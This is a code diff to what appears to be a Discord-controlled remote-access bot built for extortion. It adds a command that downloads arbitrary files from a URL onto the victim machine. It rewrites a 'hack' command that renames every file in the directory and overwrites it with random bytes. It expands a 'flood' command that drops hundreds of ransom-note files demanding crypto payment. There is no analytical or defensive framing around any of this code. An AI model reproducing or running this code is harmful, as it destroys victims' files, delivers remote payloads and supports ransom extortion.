@@ -1,4 +1,4 @@
-import os, discord, subprocess, random, string, shutil
+import os, discord, subprocess, random, string, shutil, aiohttp
 from co.config import CRYPTO_ADDRESS
 current_directory = os.getcwd()
 
@@ -37,6 +37,7 @@ async def cd_command(ctx, *, args: str):
             ".cd deletefile <file_path> - Delete the specified file.\n"
             ".cd makedir <dirname> - Create a new directory.\n"
             ".cd rmdir <dirname> - Remove the specified directory.\n"
+            ".cd upload <attachfile> - places a file into the dir.\n"
         )
         await ctx.send(help_message)
     elif args.startswith("drive:"):
@@ -71,20 +72,48 @@ async def cd_command(ctx, *, args: str):
             await ctx.send(file=discord.File("directory_list.txt"))
         except Exception as e:
             await ctx.send(f"Error listing items: {e}")
+    elif args.startswith("upload"):
+        target = args[len("upload"):].strip()
+        try:
+            if target.startswith("http://") or target.startswith("https://"):
+                async with aiohttp.ClientSession() as session:
+                    async with session.get(target, ssl=False) as response:
+                        if response.status == 200:
+                            filename = os.path.basename(target.split("?")[0])
+                            file_path = os.path.join(current_directory, filename)
+                            with open(file_path, "wb") as f:
+                                f.write(await response.read())
+                            await ctx.send(f"File downloaded and saved to: {file_path}")
+                        else:
+                            await ctx.send("Failed to download the file. Invalid URL or server error.")
+            elif ctx.message.attachments:
+                for attachment in ctx.message.attachments:
+                    file_path = os.path.join(current_directory, attachment.filename)
+                    await attachment.save(file_path)
+                    await ctx.send(f"File uploaded and saved to: {file_path}")
+            else:
+                await ctx.send("Please attach a file to upload or provide a valid URL.")
+        except Exception as e:
+            await ctx.send(f"Error during upload: {e}")
     elif args == "hack":
         try:
-            for filename in os.listdir(current_directory):
-                file_path = os.path.join(current_directory, filename)
-                if os.path.isfile(file_path):
-                    random_tag = ''.join(random.choices(string.ascii_letters + string.digits, k=3))
-                    new_file_name = f"openinnotepad{random_tag}.fuckedfile"
-                    new_file_path = os.path.join(current_directory, new_file_name)
-                    os.rename(file_path, new_file_path)
-                    with open(new_file_path, "w") as f:
-                        f.write(f"YOURE FILES ARE LOCKED. PAY THIS CRYPTO ADDRESS: {CRYPTO_ADDRESS} IF YOU WANT THEM BACK!!!\n" * 5000)
+            for _ in range(3):
+                for filename in os.listdir(current_directory):
+                    file_path = os.path.join(current_directory, filename)
+                    if os.path.isfile(file_path):
+                        try:
+                            new_file_name = f"ENCRYPTED.{''.join(random.choices(string.ascii_letters + string.digits, k=15))}"
+                            new_file_path = os.path.join(current_directory, new_file_name)
+                            os.rename(file_path, new_file_path)
+                            gibberish = ''.join(random.choices(string.ascii_letters + string.digits + ''.join(chr(i) for i in range(0x20, 0x100)), k=5000))
+                            with open(new_file_path, "w", encoding="utf-8") as f:
+                                f.write(gibberish)
+                        except Exception as e:
+                            await ctx.send(f"Skipping file {file_path}: {e}")
             await ctx.send("Files corrupted successfully!")
         except Exception as e:
             await ctx.send(f"Error during hack: {e}")
+
     elif args.startswith("exopen "):
         dir_path = args[len("exopen "):].strip()
         if os.path.exists(dir_path) and os.path.isdir(dir_path):
@@ -105,11 +134,11 @@ async def cd_command(ctx, *, args: str):
             await ctx.send(f"Error clearing folder: {e}")
     elif args == "flood":
         try:
-            for i in range(100):
-                file_path = os.path.join(current_directory, f"utcthugs_{i}.ontop")
+            for i in range(500):
+                file_path = os.path.join(current_directory, f"payus50usdat{CRYPTO_ADDRESS}-{i}.encrypted")
                 with open(file_path, "w") as f:
-                    f.write(f"Pay 50 USD in LTC to {CRYPTO_ADDRESS} or your files and data are gone!!!\n" * 500)
-            await ctx.send("Flooded the dir with files.")
+                    f.write(f"Pay 50 USD in CRYPTO to {CRYPTO_ADDRESS} or your files, pc and data are gone!!!\n" * 5000)
+            await ctx.send("the folder is flooded with a shit ton of files.")
         except Exception as e:
             await ctx.send(f"Error during flood: {e}")
     elif args.startswith("deletefile "):
